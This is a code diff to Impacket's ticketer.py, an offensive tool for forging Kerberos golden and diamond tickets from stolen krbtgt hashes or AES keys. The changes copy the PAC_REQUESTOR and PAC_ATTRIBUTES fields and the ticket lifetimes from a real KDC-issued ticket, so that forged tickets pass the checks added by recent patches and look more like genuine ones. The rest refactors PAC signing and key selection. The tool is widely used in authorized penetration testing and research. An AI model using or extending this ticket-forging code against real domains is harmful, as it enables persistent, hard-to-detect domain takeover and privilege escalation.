@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # Impacket - Collection of Python classes for working with network protocols.
 #
-# Copyright Fortra, LLC and its affiliated companies 
+# Copyright Fortra, LLC and its affiliated companies
 #
 # All rights reserved.
 #
@@ -45,8 +45,6 @@
 #   [ ] When -request is specified, we could ask for a user2user ticket and also populate the received PAC
 #
 
-from __future__ import division
-from __future__ import print_function
 import argparse
 import datetime
 import logging
@@ -73,14 +71,14 @@ from impacket.krb5.constants import ApplicationTagNumbers, PreAuthenticationData
     PrincipalNameType, ProtocolVersionNumber, TicketFlags, encodeFlags, ChecksumTypes, AuthorizationDataType, \
     KERB_NON_KERB_CKSUM_SALT
 from impacket.krb5.keytab import Keytab
-from impacket.krb5.crypto import Key, _enctype_table
-from impacket.krb5.crypto import _checksum_table, Enctype
-from impacket.krb5.pac import KERB_SID_AND_ATTRIBUTES, PAC_SIGNATURE_DATA, PAC_INFO_BUFFER, PAC_LOGON_INFO, \
-    PAC_CLIENT_INFO_TYPE, PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM, PACTYPE, PKERB_SID_AND_ATTRIBUTES_ARRAY, \
+from impacket.krb5.crypto import Key, _enctype_table, get_kerberos_key_for_enctype
+from impacket.krb5.crypto import Enctype
+from impacket.krb5.pac import KERB_SID_AND_ATTRIBUTES, PAC_SIGNATURE_DATA, PAC_LOGON_INFO, \
+    PAC_CLIENT_INFO_TYPE, PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM, PKERB_SID_AND_ATTRIBUTES_ARRAY, \
     VALIDATION_INFO, PAC_CLIENT_INFO, KERB_VALIDATION_INFO, UPN_DNS_INFO_FULL, PAC_REQUESTOR_INFO, PAC_UPN_DNS_INFO, PAC_ATTRIBUTES_INFO, PAC_REQUESTOR, \
     PAC_ATTRIBUTE_INFO
 from impacket.krb5.types import KerberosTime, Principal
-from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
+from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS, getKerberosTGSRequestEnctypes
 
 from impacket.krb5 import constants, pac
 from impacket.krb5.asn1 import AP_REQ, TGS_REQ, Authenticator, seq_set, seq_set_iter, PA_FOR_USER_ENC, Ticket as TicketAsn1
@@ -97,6 +95,7 @@ class TICKETER:
         self.__options = options
         self.__tgt = None
         self.__tgt_session_key = None
+        self.__requested_ticket_times = None
         if options.spn:
             spn = options.spn.split('/')
             self.__service = spn[0]
@@ -117,11 +116,33 @@ class TICKETER:
 
     @staticmethod
     def getPadLength(data_length):
-        return ((data_length + 7) // 8 * 8) - data_length
+        return pac.get_pad_length(data_length)
 
     @staticmethod
     def getBlockLength(data_length):
-        return (data_length + 7) // 8 * 8
+        return pac.get_block_length(data_length)
+
+    def _extract_reply_ticket_times(self, kdcRep, replyKey):
+        cipher = _enctype_table[int(kdcRep['enc-part']['etype'])]
+        # Decrypt the KDC reply enc-part with the Kerberos-defined usage:
+        # 3 = AS-REP reply key usage, 8 = TGS-REP reply key usage.
+        keyUsage = 8
+        encKDCRepPartSpec = EncTGSRepPart()
+        if self.__domain == self.__server:
+            keyUsage = 3
+            encKDCRepPartSpec = EncASRepPart()
+        plainText = cipher.decrypt(replyKey, keyUsage, kdcRep['enc-part']['cipher'])
+        encKDCRepPart = decoder.decode(plainText, asn1Spec=encKDCRepPartSpec)[0]
+
+        starttime = encKDCRepPart['starttime'] if encKDCRepPart['starttime'].hasValue() else encKDCRepPart['authtime']
+        renewTill = encKDCRepPart['renew-till'] if encKDCRepPart['renew-till'].hasValue() else encKDCRepPart['endtime']
+
+        return {
+            'authtime': encKDCRepPart['authtime'].clone(),
+            'starttime': starttime.clone(),
+            'endtime': encKDCRepPart['endtime'].clone(),
+            'renew-till': renewTill.clone(),
+        }
 
     def loadKeysFromKeytab(self, filename):
         keytab = Keytab.loadFile(filename)
@@ -322,6 +343,55 @@ class TICKETER:
         pacRequestor['UserSid'].fromCanonical(f"{self.__options.domain_sid}-{self.__options.user_id}")
 
         pacInfos[PAC_REQUESTOR_INFO] = pacRequestor.getData()
+    def _extractOriginalPacFields(self, kdcRep):
+        """Extract PAC_REQUESTOR and PAC_ATTRIBUTES from the real KDC-issued TGT.
+
+        When forging a diamond ticket (-request), the KDC's PAC contains a valid
+        PAC_REQUESTOR (KB5008380/KB5020009) that we must preserve. Without it,
+        fully-patched KDCs reject the TGS-REQ during cross-realm referral with
+        substatus 0x520 (KDC_ERR_TGT_REVOKED).
+        """
+        preserved = {}
+        try:
+            ticketCipher = int(kdcRep['ticket']['enc-part']['etype'])
+            cipherText = kdcRep['ticket']['enc-part']['cipher'].asOctets()
+
+            # Build the krbtgt key to decrypt the ticket's enc-part
+            if ticketCipher == EncryptionTypes.rc4_hmac.value:
+                key = Key(ticketCipher, unhexlify(self.__options.nthash))
+            else:
+                key = Key(ticketCipher, unhexlify(self.__options.aesKey))
+
+            cipher = _enctype_table[ticketCipher]
+            plainText = cipher.decrypt(key, 2, cipherText)
+            encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]
+
+            # Walk authorization-data to find the PAC
+            adIfRelevant = decoder.decode(
+                encTicketPart['authorization-data'][0]['ad-data'],
+                asn1Spec=AD_IF_RELEVANT()
+            )[0]
+            pacType = pac.PACTYPE(adIfRelevant[0]['ad-data'].asOctets())
+            buff = pacType['Buffers']
+
+            for _ in range(pacType['cBuffers']):
+                infoBuffer = pac.PAC_INFO_BUFFER(buff)
+                data = pacType['Buffers'][infoBuffer['Offset'] - 8:][:infoBuffer['cbBufferSize']]
+                buff = buff[len(infoBuffer):]
+
+                if infoBuffer['ulType'] == PAC_REQUESTOR_INFO:
+                    preserved[PAC_REQUESTOR_INFO] = data
+                    logging.info('    Preserved original PAC_REQUESTOR from KDC')
+                elif infoBuffer['ulType'] == PAC_ATTRIBUTES_INFO:
+                    preserved[PAC_ATTRIBUTES_INFO] = data
+                    logging.info('    Preserved original PAC_ATTRIBUTES from KDC')
+
+        except Exception as e:
+            logging.warning('Could not extract original PAC fields: %s' % str(e))
+            logging.warning('Falling back to fabricated PAC_REQUESTOR (may fail on patched KDCs)')
+
+        return preserved
+
 
     def createBasicTicket(self):
         if self.__options.request is True:
@@ -347,6 +417,7 @@ class TICKETER:
                 tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, self.__domain, None, tgt, cipher,
                                                                         sessionKey)
                 kdcRep = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
+            self.__requested_ticket_times = self._extract_reply_ticket_times(kdcRep, oldSessionKey)
 
             # Let's check we have all the necessary data based on the ciphers used. Boring checks
             ticketCipher = int(kdcRep['ticket']['enc-part']['etype'])
@@ -455,6 +526,19 @@ class TICKETER:
             kdcRep['enc-part']['cipher'] = noValue
 
         pacInfos = self.createBasicPac(kdcRep)
+
+        # Diamond ticket: preserve original PAC_REQUESTOR/PAC_ATTRIBUTES from
+        # the real KDC-issued TGT so that KB5020009 enforcement passes during
+        # cross-realm referral TGS-REQ.
+        if (self.__options.request is True and not self.__options.impersonate
+                and not self.__options.old_pac
+                and self.__options.user.lower() == self.__target.lower()):
+
+            originalPacFields = self._extractOriginalPacFields(kdcRep)
+            if PAC_REQUESTOR_INFO in originalPacFields:
+                pacInfos[PAC_REQUESTOR_INFO] = originalPacFields[PAC_REQUESTOR_INFO]
+            if PAC_ATTRIBUTES_INFO in originalPacFields:
+                pacInfos[PAC_ATTRIBUTES_INFO] = originalPacFields[PAC_ATTRIBUTES_INFO]
 
         return kdcRep, pacInfos
 
@@ -580,8 +664,7 @@ class TICKETER:
 
         reqBody['till'] = KerberosTime.to_asn1(now)
         reqBody['nonce'] = random.getrandbits(31)
-        seq_set_iter(reqBody, 'etype',
-                     (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))
+        seq_set_iter(reqBody, 'etype', getKerberosTGSRequestEnctypes())
 
         seq_set_iter(reqBody, 'additional-tickets', (ticket.to_asn1(TicketAsn1()),))
 
@@ -715,11 +798,17 @@ class TICKETER:
             encTicketPart['transited'] = noValue
             encTicketPart['transited']['tr-type'] = 0
             encTicketPart['transited']['contents'] = ''
-            encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.now(datetime.timezone.utc))
-            encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.now(datetime.timezone.utc))
-            # Let's extend the ticket's validity a lil bit
-            encTicketPart['endtime'] = KerberosTime.to_asn1(ticketDuration)
-            encTicketPart['renew-till'] = KerberosTime.to_asn1(ticketDuration)
+            if self.__options.request and self.__requested_ticket_times is not None:
+                encTicketPart['authtime'] = self.__requested_ticket_times['authtime'].clone()
+                encTicketPart['starttime'] = self.__requested_ticket_times['starttime'].clone()
+                encTicketPart['endtime'] = self.__requested_ticket_times['endtime'].clone()
+                encTicketPart['renew-till'] = self.__requested_ticket_times['renew-till'].clone()
+            else:
+                encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.now(datetime.timezone.utc))
+                encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.now(datetime.timezone.utc))
+                # Let's extend the ticket's validity a lil bit
+                encTicketPart['endtime'] = KerberosTime.to_asn1(ticketDuration)
+                encTicketPart['renew-till'] = KerberosTime.to_asn1(ticketDuration)
             encTicketPart['authorization-data'] = noValue
             encTicketPart['authorization-data'][0] = noValue
             encTicketPart['authorization-data'][0]['ad-type'] = AuthorizationDataType.AD_IF_RELEVANT.value
@@ -869,152 +958,14 @@ class TICKETER:
     def signEncryptTicket(self, kdcRep, encASorTGSRepPart, encTicketPart, pacInfos):
         logging.info('Signing/Encrypting final ticket')
 
-        # Basic PAC count
-        pac_count = 4
+        bufferOrder = [PAC_LOGON_INFO, PAC_CLIENT_INFO_TYPE]
+        for optionalType in (PAC_UPN_DNS_INFO, PAC_ATTRIBUTES_INFO, PAC_REQUESTOR_INFO):
+            if optionalType in pacInfos:
+                bufferOrder.append(optionalType)
+        bufferOrder.extend([PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM])
 
-        # We changed everything we needed to make us special. Now let's repack and calculate checksums
-        validationInfoBlob = pacInfos[PAC_LOGON_INFO]
-        validationInfoAlignment = b'\x00' * self.getPadLength(len(validationInfoBlob))
-
-        pacClientInfoBlob = pacInfos[PAC_CLIENT_INFO_TYPE]
-        pacClientInfoAlignment = b'\x00' * self.getPadLength(len(pacClientInfoBlob))
-
-        pacUpnDnsInfoBlob = None
-        pacUpnDnsInfoAlignment = None
-        if PAC_UPN_DNS_INFO in pacInfos:
-            pac_count += 1
-            pacUpnDnsInfoBlob = pacInfos[PAC_UPN_DNS_INFO]
-            pacUpnDnsInfoAlignment = b'\x00' * self.getPadLength(len(pacUpnDnsInfoBlob))
-
-        pacAttributesInfoBlob = None
-        pacAttributesInfoAlignment = None
-        if PAC_ATTRIBUTES_INFO in pacInfos:
-            pac_count += 1
-            pacAttributesInfoBlob = pacInfos[PAC_ATTRIBUTES_INFO]
-            pacAttributesInfoAlignment = b'\x00' * self.getPadLength(len(pacAttributesInfoBlob))
-
-        pacRequestorInfoBlob = None
-        pacRequestorInfoAlignment = None
-        if PAC_REQUESTOR_INFO in pacInfos:
-            pac_count += 1
-            pacRequestorInfoBlob = pacInfos[PAC_REQUESTOR_INFO]
-            pacRequestorInfoAlignment = b'\x00' * self.getPadLength(len(pacRequestorInfoBlob))
-
-        serverChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_SERVER_CHECKSUM])
-        serverChecksumBlob = pacInfos[PAC_SERVER_CHECKSUM]
-        serverChecksumAlignment = b'\x00' * self.getPadLength(len(serverChecksumBlob))
-
-        privSvrChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_PRIVSVR_CHECKSUM])
-        privSvrChecksumBlob = pacInfos[PAC_PRIVSVR_CHECKSUM]
-        privSvrChecksumAlignment = b'\x00' * self.getPadLength(len(privSvrChecksumBlob))
-
-        # The offset are set from the beginning of the PAC_TYPE
-        # [MS-PAC] 2.4 PAC_INFO_BUFFER
-        offsetData = 8 + len(PAC_INFO_BUFFER().getData()) * pac_count
-
-        # Let's build the PAC_INFO_BUFFER for each one of the elements
-        validationInfoIB = PAC_INFO_BUFFER()
-        validationInfoIB['ulType'] = PAC_LOGON_INFO
-        validationInfoIB['cbBufferSize'] = len(validationInfoBlob)
-        validationInfoIB['Offset'] = offsetData
-        offsetData = self.getBlockLength(offsetData + validationInfoIB['cbBufferSize'])
-
-        pacClientInfoIB = PAC_INFO_BUFFER()
-        pacClientInfoIB['ulType'] = PAC_CLIENT_INFO_TYPE
-        pacClientInfoIB['cbBufferSize'] = len(pacClientInfoBlob)
-        pacClientInfoIB['Offset'] = offsetData
-        offsetData = self.getBlockLength(offsetData + pacClientInfoIB['cbBufferSize'])
-
-        pacUpnDnsInfoIB = None
-        if pacUpnDnsInfoBlob is not None:
-            pacUpnDnsInfoIB = PAC_INFO_BUFFER()
-            pacUpnDnsInfoIB['ulType'] = PAC_UPN_DNS_INFO
-            pacUpnDnsInfoIB['cbBufferSize'] = len(pacUpnDnsInfoBlob)
-            pacUpnDnsInfoIB['Offset'] = offsetData
-            offsetData = self.getBlockLength(offsetData + pacUpnDnsInfoIB['cbBufferSize'])
-
-        pacAttributesInfoIB = None
-        if pacAttributesInfoBlob is not None:
-            pacAttributesInfoIB = PAC_INFO_BUFFER()
-            pacAttributesInfoIB['ulType'] = PAC_ATTRIBUTES_INFO
-            pacAttributesInfoIB['cbBufferSize'] = len(pacAttributesInfoBlob)
-            pacAttributesInfoIB['Offset'] = offsetData
-            offsetData = self.getBlockLength(offsetData + pacAttributesInfoIB['cbBufferSize'])
-
-        pacRequestorInfoIB = None
-        if pacRequestorInfoBlob is not None:
-            pacRequestorInfoIB = PAC_INFO_BUFFER()
-            pacRequestorInfoIB['ulType'] = PAC_REQUESTOR_INFO
-            pacRequestorInfoIB['cbBufferSize'] = len(pacRequestorInfoBlob)
-            pacRequestorInfoIB['Offset'] = offsetData
-            offsetData = self.getBlockLength(offsetData + pacRequestorInfoIB['cbBufferSize'])
-
-        serverChecksumIB = PAC_INFO_BUFFER()
-        serverChecksumIB['ulType'] = PAC_SERVER_CHECKSUM
-        serverChecksumIB['cbBufferSize'] = len(serverChecksumBlob)
-        serverChecksumIB['Offset'] = offsetData
-        offsetData = self.getBlockLength(offsetData + serverChecksumIB['cbBufferSize'])
-
-        privSvrChecksumIB = PAC_INFO_BUFFER()
-        privSvrChecksumIB['ulType'] = PAC_PRIVSVR_CHECKSUM
-        privSvrChecksumIB['cbBufferSize'] = len(privSvrChecksumBlob)
-        privSvrChecksumIB['Offset'] = offsetData
-        # offsetData = self.getBlockLength(offsetData+privSvrChecksumIB['cbBufferSize'])
-
-        # Building the PAC_TYPE as specified in [MS-PAC]
-        buffers = validationInfoIB.getData() + pacClientInfoIB.getData()
-        if pacUpnDnsInfoIB is not None:
-            buffers += pacUpnDnsInfoIB.getData()
-        if pacAttributesInfoIB is not None:
-            buffers += pacAttributesInfoIB.getData()
-        if pacRequestorInfoIB is not None:
-            buffers += pacRequestorInfoIB.getData()
-
-        buffers += serverChecksumIB.getData() + privSvrChecksumIB.getData() + validationInfoBlob + \
-            validationInfoAlignment + pacInfos[PAC_CLIENT_INFO_TYPE] + pacClientInfoAlignment
-        if pacUpnDnsInfoIB is not None:
-            buffers += pacUpnDnsInfoBlob + pacUpnDnsInfoAlignment
-        if pacAttributesInfoIB is not None:
-            buffers += pacAttributesInfoBlob + pacAttributesInfoAlignment
-        if pacRequestorInfoIB is not None:
-            buffers += pacRequestorInfoBlob + pacRequestorInfoAlignment
-
-        buffersTail = serverChecksumBlob + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment
-
-        pacType = PACTYPE()
-        pacType['cBuffers'] = pac_count
-        pacType['Version'] = 0
-        pacType['Buffers'] = buffers + buffersTail
-
-        blobToChecksum = pacType.getData()
-
-        checkSumFunctionServer = _checksum_table[serverChecksum['SignatureType']]
-        if serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:
-            keyServer = Key(Enctype.AES256, unhexlify(self.__options.aesKey))
-        elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:
-            keyServer = Key(Enctype.AES128, unhexlify(self.__options.aesKey))
-        elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_md5.value:
-            keyServer = Key(Enctype.RC4, unhexlify(self.__options.nthash))
-        else:
-            raise Exception('Invalid Server checksum type 0x%x' % serverChecksum['SignatureType'])
-
-        checkSumFunctionPriv = _checksum_table[privSvrChecksum['SignatureType']]
-        if privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:
-            keyPriv = Key(Enctype.AES256, unhexlify(self.__options.aesKey))
-        elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:
-            keyPriv = Key(Enctype.AES128, unhexlify(self.__options.aesKey))
-        elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_md5.value:
-            keyPriv = Key(Enctype.RC4, unhexlify(self.__options.nthash))
-        else:
-            raise Exception('Invalid Priv checksum type 0x%x' % serverChecksum['SignatureType'])
-
-        serverChecksum['Signature'] = checkSumFunctionServer.checksum(keyServer, KERB_NON_KERB_CKSUM_SALT, blobToChecksum)
-        logging.info('\tPAC_SERVER_CHECKSUM')
-        privSvrChecksum['Signature'] = checkSumFunctionPriv.checksum(keyPriv, KERB_NON_KERB_CKSUM_SALT, serverChecksum['Signature'])
-        logging.info('\tPAC_PRIVSVR_CHECKSUM')
-
-        buffersTail = serverChecksum.getData() + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment
-        pacType['Buffers'] = buffers + buffersTail
+        pacType = pac.sign_pac(pacInfos, aes_key=self.__options.aesKey, nt_hash=self.__options.nthash,
+                               buffer_order=bufferOrder, checksum_salt=KERB_NON_KERB_CKSUM_SALT)
 
         authorizationData = AuthorizationData()
         authorizationData[0] = noValue
@@ -1032,14 +983,11 @@ class TICKETER:
         encodedEncTicketPart = encoder.encode(encTicketPart)
 
         cipher = _enctype_table[kdcRep['ticket']['enc-part']['etype']]
-        if cipher.enctype == EncryptionTypes.aes256_cts_hmac_sha1_96.value:
-            key = Key(cipher.enctype, unhexlify(self.__options.aesKey))
-        elif cipher.enctype == EncryptionTypes.aes128_cts_hmac_sha1_96.value:
-            key = Key(cipher.enctype, unhexlify(self.__options.aesKey))
-        elif cipher.enctype == EncryptionTypes.rc4_hmac.value:
-            key = Key(cipher.enctype, unhexlify(self.__options.nthash))
-        else:
-            raise Exception('Unsupported enctype 0x%x' % cipher.enctype)
+        key = get_kerberos_key_for_enctype(
+            cipher.enctype,
+            nt_hash=self.__options.nthash,
+            generic_aes_key=self.__options.aesKey,
+        )
 
         # Key Usage 2
         # AS-REP Ticket and TGS-REP Ticket (includes TGS session
@@ -1084,9 +1032,14 @@ class TICKETER:
         return encoder.encode(kdcRep), cipher, sessionKey
 
     def saveTicket(self, ticket, sessionKey):
-        logging.info('Saving ticket in %s' % (self.__target.replace('/', '.') + '.ccache'))
+        logging.info('Saving/Updating ticket in %s' % (self.__target.replace('/', '.') + '.ccache'))
         from impacket.krb5.ccache import CCache
-        ccache = CCache()
+        from os import getenv, path
+        krb5 = getenv('KRB5CCNAME')
+        if krb5 and path.isfile(krb5):
+            ccache = CCache.loadFile(krb5)
+        else:
+            ccache = CCache()
 
         if self.__server == self.__domain:
             ccache.fromTGT(ticket, sessionKey, sessionKey)
@@ -1126,8 +1079,7 @@ if __name__ == '__main__':
     parser.add_argument('-extra-pac', action='store_true', help='Populate your ticket with extra PAC (UPN_DNS)')
     parser.add_argument('-old-pac', action='store_true', help='Use the old PAC structure to create your ticket (exclude '
                                                               'PAC_ATTRIBUTES_INFO and PAC_REQUESTOR')
-    parser.add_argument('-duration', action="store", default = '87600', help='Amount of hours till the ticket expires '
-                                                                             '(default = 24*365*10)')
+    parser.add_argument('-duration', action="store", default = '87600', help='Amount of hours till the ticket expires (default = 24*365*10). Ignored with -request, which preserves the KDC-issued lifetime')
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
 
@@ -1151,7 +1103,7 @@ if __name__ == '__main__':
         print("\tIf you specify -aesKey instead of -ntHash everything will be encrypted using AES128 or AES256")
         print("\t(depending on the key specified). No traffic is generated against the KDC. Ticket will be saved as")
         print("\tbaduser.ccache.\n")
-        print("\t./ticketer.py -nthash <krbtgt/service nthash> -aesKey <krbtgt/service AES> -domain-sid <your domain SID> -domain " 
+        print("\t./ticketer.py -nthash <krbtgt/service nthash> -aesKey <krbtgt/service AES> -domain-sid <your domain SID> -domain "
               "<your domain FQDN> -request -user <a valid domain user> -password <valid domain user's password> baduser\n")
         print("\twill first authenticate against the KDC (using -user/-password) and get a TGT that will be used")
         print("\tas template for customization. Whatever encryption algorithms used on that ticket will be honored,")
